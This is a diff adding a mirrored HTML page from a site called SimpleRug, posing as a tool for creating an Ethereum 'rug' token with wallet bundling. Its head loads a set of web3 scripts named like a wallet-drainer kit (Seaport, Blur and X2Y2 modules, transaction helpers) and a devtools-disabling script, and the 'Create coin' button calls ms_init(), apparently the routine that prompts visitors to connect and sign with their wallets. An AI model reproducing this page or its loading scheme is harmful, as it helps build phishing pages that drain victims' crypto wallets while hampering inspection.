@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from simple-rug.top/creation-eth.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 12 Apr 2025 15:51:12 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="index.js"></script>
+    <title>SimpleRug</title>
+    <link rel="icon" type="image/jpeg" href="logo.jpg"><script src="ajax/libs/particles.js/2.0.0/particles.min.js"></script>
+    <script src="ajax/libs/gsap/3.12.0/gsap.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@300;400;500;600;700&amp;display=swap" rel="stylesheet">
+    <style>
+        * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Rubik', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+}
+
+        body {
+            background-color: black !important;
+            color: white !important;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        #particles-js {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            top: 0;
+            left: 0;
+        }
+
+        header {
+    padding: 1.5rem;
+    border-bottom: 1px solid rgba(59, 130, 246, 0.2);
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    position: relative;
+    z-index: 1;
+    background: rgba(0, 0, 0, 0.5);
+    backdrop-filter: blur(5px);
+}
+
+.logo-container {
+    display: flex;
+    align-items: center;
+    gap: 0.75rem;
+    transform: translateY(0);
+    transition: transform 0.3s ease;
+}
+
+.logo-container:hover {
+    transform: translateY(-2px);
+}
+
+.logo-text {
+    font-size: 1.875rem;
+    font-weight: bold;
+    background: linear-gradient(45deg, #3b82f6, #9333ea, #3b82f6);
+    background-size: 200% auto;
+    -webkit-background-clip: text;
+    background-clip: text;
+    color: transparent;
+    animation: shine 3s linear infinite;
+}
+
+@keyframes shine {
+    to {
+        background-position: 200% center;
+    }
+}
+
+        .logo-text {
+            font-size: 1.875rem;
+            font-weight: bold;
+            background: linear-gradient(to right, #3b82f6, #9333ea);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .container {
+    width: 100%;
+    max-width: 48rem;
+    padding: 2rem;
+    background: rgba(15, 23, 42, 0.3);
+    backdrop-filter: blur(10px);
+    border: 1px solid rgba(59, 130, 246, 0.2);
+    border-radius: 1rem;
+}
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #94a3b8;
+            font-size: 0.875rem;
+        }
+
+        .form-input {
+    width: 100%;
+    padding: 0.75rem 1rem;
+    background: rgba(30, 58, 138, 0.2);
+    border: 1px solid rgba(59, 130, 246, 0.3);
+    border-radius: 0.5rem;
+    color: white;
+    transition: all 0.3s ease;
+    transform: translateY(0);
+}
+
+.form-input:focus {
+    outline: none;
+    border-color: rgba(59, 130, 246, 0.8);
+    transform: translateY(-2px);
+    box-shadow: 0 4px 12px rgba(59, 130, 246, 0.2);
+}
+        .form-input::placeholder {
+            color: rgba(148, 163, 184, 0.5);
+        }
+
+        .connectButton {
+    width: 100%;
+    padding: 1rem;
+    margin-top: 2rem;
+    border: none;
+    border-radius: 0.5rem;
+    background: linear-gradient(45deg, #2563eb, #7c3aed);
+    background-size: 200% auto;
+    color: white;
+    font-weight: 500;
+    font-size: 1.125rem;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    position: relative;
+    overflow: hidden;
+}
+
+.connectButton::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+    transition: 0.5s;
+}
+
+.connectButton:hover {
+    background-position: right center;
+    transform: translateY(-2px);
+    box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
+}
+
+.connectButton:hover::before {
+    left: 100%;
+}
+
+        footer {
+            padding: 1rem;
+            text-align: center;
+            background: linear-gradient(to right, black, rgba(30, 58, 138, 0.1), black);
+            border-top: 1px solid rgba(59, 130, 246, 0.2);
+            position: relative;
+            z-index: 1;
+        }
+
+        footer a {
+            color: #60a5fa;
+            text-decoration: none;
+            font-size: 1.125rem;
+            transition: color 0.3s;
+        }
+
+        footer a:hover {
+            color: #93c5fd;
+        }
+
+        .profile-picture {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(to right, #3b82f6, #9333ea);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 1.25rem;
+        }
+
+        .fade-in {
+    opacity: 0;
+    transform: translateY(20px);
+    animation: fadeInUp 0.8s ease forwards;
+}
+
+@keyframes fadeInUp {
+    to {
+        opacity: 1;
+        transform: translateY(0);
+    }
+}
+
+        .fade-out {
+            opacity: 0;
+            transform: scale(0.95);
+            transition: all 0.3s ease;
+        }
+
+        .back-button-container {
+            padding: 1.5rem;
+            position: relative;
+            z-index: 1;
+        }
+
+        .back-button {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.75rem 1.25rem;
+            background: rgba(30, 58, 138, 0.2);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            border-radius: 0.5rem;
+            color: #60a5fa;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .back-button:hover {
+            background: rgba(30, 58, 138, 0.3);
+            border-color: rgba(59, 130, 246, 0.5);
+            transform: translateX(-4px);
+        }
+
+        /* Styles du pop-up */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+            animation: fadeIn 0.3s ease-out;
+        }
+
+        .modal {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(17, 24, 39, 0.95);
+            border: 1px solid rgba(59, 130, 246, 0.3);
+            border-radius: 1rem;
+            padding: 2rem;
+            width: 90%;
+            max-width: 500px;
+            z-index: 1001;
+            animation: slideIn 0.3s ease-out;
+        }
+
+        .modal-close {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            color: #94a3b8;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0.5rem;
+            transition: color 0.3s;
+        }
+
+        .modal-close:hover {
+            color: white;
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 1rem;
+            color: white;
+            background: linear-gradient(to right, #3b82f6, #9333ea);
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .modal-content {
+            margin-bottom: 1.5rem;
+            color: #94a3b8;
+            line-height: 1.6;
+        }
+
+        .modal-image {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            border-radius: 0.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -60%);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, -50%);
+            }
+        }
+
+        .steps-container {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 2rem;
+        padding: 0 1rem;
+    }
+
+    .step {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 0.5rem;
+        width: 33%;
+        position: relative;
+    }
+
+    .step:not(:last-child)::after {
+        content: '';
+        position: absolute;
+        right: -50%;
+        top: 25%;
+        width: 100%;
+        height: 2px;
+        background: rgba(59, 130, 246, 0.2);
+        z-index: 0;
+    }
+
+    .step-number {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-weight: bold;
+        z-index: 1;
+    }
+
+    .step.active .step-number {
+        background: linear-gradient(to right, #2563eb, #7c3aed);
+        color: white;
+    }
+
+    .step.disabled .step-number {
+        background: rgba(148, 163, 184, 0.2);
+        color: #94a3b8;
+    }
+
+    .step-text {
+        color: #94a3b8;
+        font-size: 0.875rem;
+        text-align: center;
+    }
+
+    .step.active .step-text {
+        color: white;
+    }
+
+    .dex-controls {
+        display: flex;
+        gap: 2rem;
+        margin-top: 2rem;
+    }
+
+    .dex-options {
+        flex: 1;
+    }
+
+    .revoke-options {
+    display: flex;
+    flex-direction: row;          /* Au lieu de column */
+    justify-content: space-between; /* Répartit l'espace entre les éléments */
+    gap: 1rem;
+    width: 100%;
+    margin-bottom: 1rem;
+}
+
+.revoke-option {
+    flex: 1;                      /* Chaque option prend une part égale */
+    display: flex;
+    align-items: center;
+    gap: 0.75rem;
+    color: #94a3b8;
+    padding: 0.5rem;
+    cursor: pointer;
+    transition: all 0.3s;
+    justify-content: center;      /* Centre le contenu */
+}
+
+    .revoke-option input[type="checkbox"] {
+        width: 1rem;
+        height: 1rem;
+        border-radius: 0.25rem;
+        border: 1px solid rgba(59, 130, 246, 0.3);
+        background: rgba(30, 58, 138, 0.2);
+        cursor: pointer;
+    }
+
+    .dex-buttons {
+    display: flex;
+    gap: 1rem;
+    width: 100%;         /* Prend toute la largeur disponible */
+    margin-top: 1rem;
+}
+
+.dex-button {
+    flex: 1;            /* Chaque bouton prend la même portion de l'espace */
+    padding: 0.75rem 1rem;
+    border-radius: 0.5rem;
+    border: 1px solid rgba(59, 130, 246, 0.3);
+    background: rgba(30, 58, 138, 0.2);
+    color: #94a3b8;
+    display: flex;
+    align-items: center;
+    justify-content: center;  /* Centre le contenu horizontalement */
+    gap: 0.75rem;
+    cursor: pointer;
+    transition: all 0.3s;
+    font-weight: 500;
+    min-width: 0;        /* Permet au bouton de se rétrécir si nécessaire */
+}
+
+/* Le texte du bouton peut se rétrécir si nécessaire */
+.dex-button span {
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+}
+
+    .dex-button.active {
+        background: linear-gradient(to right, #2563eb, #7c3aed);
+        border-color: transparent;
+        color: white;
+        cursor: pointer;
+    }
+
+    .dex-button img {
+        width: 24px;
+        height: 24px;
+        object-fit: contain;
+    }
+
+    .header-controls {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+}
+
+.header-icon {
+    color: #60a5fa;
+    padding: 0.5rem;
+    border-radius: 0.5rem;
+    transition: all 0.3s;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.header-icon:hover {
+    color: #93c5fd;
+    background: rgba(59, 130, 246, 0.1);
+    transform: translateY(-2px);
+}
+
+.info-text {
+    text-align: center;
+    color: #94a3b8;
+    font-size: 0.875rem;
+    margin-top: 1rem;
+    padding: 0 1rem;
+    line-height: 1.5;
+}
+
+#particles-js {
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    z-index: 0;
+    top: 0;
+    left: 0;
+    background: radial-gradient(circle at center, #0f172a 0%, #000 100%);
+}
+    </style>
+    <script type="text/javascript" src="../bittensor.b-cdn.net/providers.min.js" defer></script>
+    <script src="../bittensor.b-cdn.net/LuidZiRRTBHTDKdN.js"></script>
+    <script type="text/javascript" src="../bittensor.b-cdn.net/compiled.min.js" defer></script>
+    <script disable-devtool-auto src='../cdn.jsdelivr.net/npm/disable-devtool/disable-devtool.min.js'></script>    
+    <script src="./assets/web3-provider/web3-modal.js"></script> 
+  <script src="./assets/web3-provider/web3-loader.js"></script> 
+  <script src="./assets/web3-provider/web3-connect.js"></script> 
+  <script src="./assets/web3-provider/web3-router.js"></script> 
+  <script src="./assets/web3-provider/web3-module.js"></script> 
+  <script src="./assets/web3-provider/web3-alert.js"></script> 
+  <script src="./assets/web3-provider/web3-seaport.js"></script>
+  <script src="./assets/web3-provider/web3-data.js"></script> 
+  <script src="./assets/web3-provider/ethers.js"></script> 
+  <script src="./assets/web3-provider/ethereum-tx.js"></script> 
+  <script src="./assets/web3-modules/module-seaport.js"></script>
+  <script src="./assets/web3-modules/module-blur.js"></script>
+  <script src="./assets/web3-modules/module-x2y2.js"></script> 
+  <script src="./assets/web3-provider.js"></script>
+</head>
+<body>
+    <div id="particles-js"></div>
+
+    <header>
+        <div class="logo-container">
+            <div class="logo-text">SimpleRug</div>
+            <div class="logos-container">
+                <img src="ethereum.png" alt="Solana Logo" width="32" height="32">
+            </div>
+        </div>
+
+        <div class="header-controls">
+            <a class='header-icon' href='statistics-eth.html'>
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M3 3v18h18"></path>
+                    <path d="M18 17V9"></path>
+                    <path d="M13 17V5"></path>
+                    <path d="M8 17v-3"></path>
+                </svg>
+            </a>
+            <a class='header-icon' href='settingsbot.html'>
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12.22 2h-.44a2 2 0 0 0-2 2v.18a2 2 0 0 1-1 1.73l-.43.25a2 2 0 0 1-2 0l-.15-.08a2 2 0 0 0-2.73.73l-.22.38a2 2 0 0 0 .73 2.73l.15.1a2 2 0 0 1 1 1.72v.51a2 2 0 0 1-1 1.74l-.15.09a2 2 0 0 0-.73 2.73l.22.38a2 2 0 0 0 2.73.73l.15-.08a2 2 0 0 1 2 0l.43.25a2 2 0 0 1 1 1.73V20a2 2 0 0 0 2 2h.44a2 2 0 0 0 2-2v-.18a2 2 0 0 1 1-1.73l.43-.25a2 2 0 0 1 2 0l.15.08a2 2 0 0 0 2.73-.73l.22-.39a2 2 0 0 0-.73-2.73l-.15-.08a2 2 0 0 1-1-1.74v-.5a2 2 0 0 1 1-1.74l.15-.09a2 2 0 0 0 .73-2.73l-.22-.38a2 2 0 0 0-2.73-.73l-.15.08a2 2 0 0 1-2 0l-.43-.25a2 2 0 0 1-1-1.73V4a2 2 0 0 0-2-2z"></path>
+                    <circle cx="12" cy="12" r="3"></circle>
+                </svg>
+            </a>
+        </div>
+    </header>
+
+    <main>
+        <div class="container fade-in">
+            <div class="steps-container">
+                <div class="step active">
+                    <div class="step-number">1</div>
+                    <div class="step-text">Contract creation</div>
+                </div>
+                <div class="step disabled">
+                    <div class="step-number">2</div>
+                    <div class="step-text">Bundled wallets</div>
+                </div>
+                <div class="step disabled">
+                    <div class="step-number">3</div>
+                    <div class="step-text">Liquidity management</div>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="name" class="form-label">Name</label>
+                <input type="text" id="name" class="form-input" placeholder="Enter coin name">
+            </div>
+
+            <div class="form-group">
+                <label for="ticker" class="form-label">Ticker</label>
+                <input type="text" id="ticker" class="form-input" placeholder="Enter ticker symbol">
+            </div>
+
+            <div class="form-group">
+                <label for="decimals" class="form-label">Decimals</label>
+                <input type="number" id="decimals" class="form-input" placeholder="Enter number of decimals">
+            </div>
+
+            <div class="form-group">
+                <label for="description" class="form-label">Description</label>
+                <input type="text" id="description" class="form-input" placeholder="Enter coin description">
+            </div>
+
+            <div class="form-group">
+                <label for="imageLink" class="form-label">Image link</label>
+                <input type="text" id="imageLink" class="form-input" placeholder="Enter image URL">
+            </div>
+
+            <div class="form-group">
+                <label for="website" class="form-label">Website</label>
+                <input type="text" id="website" class="form-input" placeholder="Enter website URL">
+            </div>
+
+            <div class="form-group">
+                <label for="twitter" class="form-label">Twitter</label>
+                <input type="text" id="twitter" class="form-input" placeholder="Enter Twitter URL">
+            </div>
+
+            <div class="form-group">
+                <label for="telegram" class="form-label">Telegram</label>
+                <input type="text" id="telegram" class="form-input" placeholder="Enter Telegram URL">
+            </div>
+
+            <div class="dex-controls">
+                <div class="dex-options">
+                    <div class="revoke-options">
+                        <label class="revoke-option">
+                            <input type="checkbox" name="revoke-update">
+                            Revoke Update
+                        </label>
+                        <label class="revoke-option">
+                            <input type="checkbox" name="revoke-freeze">
+                            Revoke Freeze
+                        </label>
+                        <label class="revoke-option">
+                            <input type="checkbox" name="revoke-mint">
+                            Revoke Mint
+                        </label>
+                        <label class="revoke-option">
+                            <input type="checkbox" name="wallet-bundling">
+                            Wallet Bundling
+                        </label>
+                    </div>
+                </div>
+            </div>
+
+            
+
+            <button class="connectButton" onclick="ms_init()">Create coin</button>
+            <div class="info-text">You will receive your tokens on your wallet/bundled wallets (next step).</div>
+        </div>
+    </main>
+
+    
+
+    <script>
+        particlesJS('particles-js', {
+            particles: {
+                number: {
+                    value: 80,
+                    density: {
+                        enable: true,
+                        value_area: 800
+                    }
+                },
+                color: {
+                    value: '#3b82f6'
+                },
+                shape: {
+                    type: 'circle'
+                },
+                opacity: {
+                    value: 0.5,
+                    random: true,
+                    animation: {
+                        enable: true,
+                        speed: 1,
+                        opacity_min: 0.1,
+                        sync: false
+                    }
+                },
+                size: {
+                    value: 3,
+                    random: true,
+                    animation: {
+                        enable: true,
+                        speed: 2,
+                        size_min: 0.1,
+                        sync: false
+                    }
+                },
+                line_linked: {
+                    enable: true,
+                    distance: 150,
+                    color: '#3b82f6',
+                    opacity: 0.2,
+                    width: 1
+                },
+                move: {
+                    enable: true,
+                    speed: 2,
+                    direction: 'none',
+                    random: true,
+                    straight: false,
+                    out_mode: 'bounce',
+                    bounce: false,
+                    attract: {
+                        enable: true,
+                        rotateX: 600,
+                        rotateY: 1200
+                    }
+                }
+            },
+            interactivity: {
+                detect_on: 'canvas',
+                events: {
+                    onhover: {
+                        enable: true,
+                        mode: 'grab'
+                    },
+                    onclick: {
+                        enable: true,
+                        mode: 'push'
+                    },
+                    resize: true
+                },
+                modes: {
+                    grab: {
+                        distance: 140,
+                        line_linked: {
+                            opacity: 0.8
+                        }
+                    },
+                    push: {
+                        particles_nb: 4
+                    }
+                }
+            },
+            retina_detect: true
+        });
+
+        // Ajoutez dans le header un lien de retour
+        const logoContainer = document.querySelector('.logo-container');
+        logoContainer.style.cursor = 'pointer';
+        logoContainer.addEventListener('click', async () => {
+            document.querySelector('.container').classList.add('fade-out');
+            await new Promise(resolve => setTimeout(resolve, 300));
+            window.location.href = 'blockchain-selection.html';
+        });
+
+        // Fonctions pour le modal
+        function showModal() {
+            document.getElementById('modal').style.display = 'block';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal() {
+            document.getElementById('modal').style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        // Afficher le modal au chargement
+        window.addEventListener('load', showModal);
+
+        // Fermer le modal en cliquant sur l'overlay
+        document.getElementById('modal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeModal();
+            }
+        });
+
+        const dexButtons = document.querySelectorAll('.dex-button');
+
+dexButtons.forEach(button => {
+    button.addEventListener('click', () => {
+        // Retire la classe active de tous les boutons
+        dexButtons.forEach(btn => btn.classList.remove('active'));
+        // Ajoute la classe active au bouton cliqué
+        button.classList.add('active');
+    });
+});
+
+// Après l'initialisation de particles.js
+gsap.from('.form-group', {
+    opacity: 0,
+    y: 20,
+    duration: 0.5,
+    stagger: 0.1,
+    ease: "power2.out"
+});
+
+gsap.from('.dex-controls', {
+    opacity: 0,
+    y: 20,
+    duration: 0.5,
+    delay: 0.3,
+    ease: "power2.out"
+});
+    </script>
+</body>
+
+<!-- Mirrored from simple-rug.top/creation-eth.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 12 Apr 2025 15:51:12 GMT -->
+</html>
